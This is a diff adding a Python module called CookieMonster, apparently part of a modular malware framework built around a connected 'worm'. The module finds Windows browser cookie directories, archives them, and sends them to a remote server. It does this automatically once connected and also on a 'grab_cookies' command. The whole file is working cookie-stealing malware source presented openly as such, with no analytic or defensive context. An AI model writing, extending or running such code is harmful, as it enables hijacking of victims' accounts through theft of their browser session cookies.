@@ -1,0 +1,66 @@
+#!name##CookieMonster
+#!types##module
+#!info##Steal cookies from the most popular browser. Required Worm with connection.
+#!reqFood##FOOD_WinCookiesPath##FOOD_WinCookiesPath##Path to cookies directory
+#!reqSMod##DustMan
+#!system_FLAG##[W]
+
+
+import os
+from typing import Union
+from time import sleep
+
+class CookieMonster:
+    MTYPES = "mal"
+    def __init__(self, worm: object):
+        self.worm = worm
+        self.dustman = DustMan(self)
+        self.raw_cookies_path = {{FOOD_WinCookiesPath}}
+        self.cookies_path = []
+    
+    def make_path(self, raw: str) -> Union[str, None]:
+        main_index = raw[1:].find("%")
+        main = raw[1:main_index + 1]
+        change = raw[main_index + 2:]
+        main = os.getenv(main)
+        path = main + change
+        if os.path.exists(path):
+            print("Find Cookies: ", path)
+            return path
+        else:
+            return None
+    
+    def check_cookies(self) -> None:
+        self.cookies_path = []
+        for rc in self.raw_cookies_path:
+            cp = self.make_path(rc[1])
+            if cp:
+                self.cookies_path.append((rc[0], cp))
+    
+
+
+    def steal_cookies(self) -> None:
+        for cp in self.cookies_path:
+            cookie = self.dustman.make_trash(cp[1], name=f"cookies_{cp[0]}.tar")
+            self.worm.send_file(cookie, f"cookies_{cp[0]}.tar", "cookies")
+    
+    def exec_cmd(self, cmd: dict) -> None:
+        match cmd["cmd"]:
+            case "grab_cookies":
+                self.check_cookies()
+                self.steal_cookies()
+    
+    def help(self) -> str:
+        h = "\n ------- Cookies Monster Help ---------\n"
+        h += f"{'grab_cookies':<25}Grab cookies and send to server\n"
+        return h
+
+    
+    def work(self) -> None:
+        while not self.worm.is_conn:
+            sleep(1)
+        self.check_cookies()
+        self.steal_cookies()
+
+    def start(self) -> None:
+        self.work()
